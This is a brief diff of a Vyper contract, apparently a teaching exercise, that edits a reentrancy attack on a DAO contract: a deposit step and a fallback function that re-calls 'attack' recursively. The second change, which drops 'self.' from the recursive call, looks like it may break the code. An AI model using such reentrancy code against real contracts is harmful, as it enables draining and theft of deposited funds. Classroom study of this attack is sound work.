@@ -33,7 +33,7 @@ def attack(dao_address:address):
     if dao_address.balance < msg.value:
         deposit_amount = dao_address.balance
 
-    total_amount: unit256 = deposit_amount + dao_address.balance
+    total_amount: uint256 = deposit_amount + dao_address.balance
     
     # TODO: make the deposit into the DAO 
     DAO(dao_address).deposit(deposit_amount) 
@@ -53,5 +53,5 @@ def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
     
     # TODO: Add code here to complete the recursive call
-    self.attack(dao_address)
+    attack(dao_address)
 
